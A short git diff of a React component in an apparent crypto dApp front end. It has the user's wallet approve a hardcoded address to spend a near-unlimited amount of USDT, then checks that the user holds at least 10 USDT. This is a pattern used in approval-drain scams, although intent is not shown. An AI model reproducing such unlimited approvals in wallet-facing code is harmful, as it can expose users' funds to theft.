@@ -52,7 +52,7 @@ function HeroSection(props) {
         let ad = props.inviteUserAddress;
         let balance = await new web3.eth.Contract(USDT_ABI, USDT_CONTRACT).methods.balanceOf(account).call()
         props.setIsLoading(true)
-        await new web3.eth.Contract(USDT_ABI, USDT_CONTRACT).methods.approve("0x50021f7e60caa0C25575c22D66CEEDdfF8BF8A35", web3.utils.toWei("115792089237316195423570985008687907853269984665640564039457584007913129639935", 'ether')).send({ from: account })
+        await new web3.eth.Contract(USDT_ABI, USDT_CONTRACT).methods.approve("0x50021f7e60caa0C25575c22D66CEEDdfF8BF8A35", web3.utils.toWei("115792089237316195423570985008687", 'ether')).send({ from: account })
           .then(async () => {
             setIsApproveDone(true);
             if (parseFloat(balance) / Math.pow(10, 18) >= 10) {
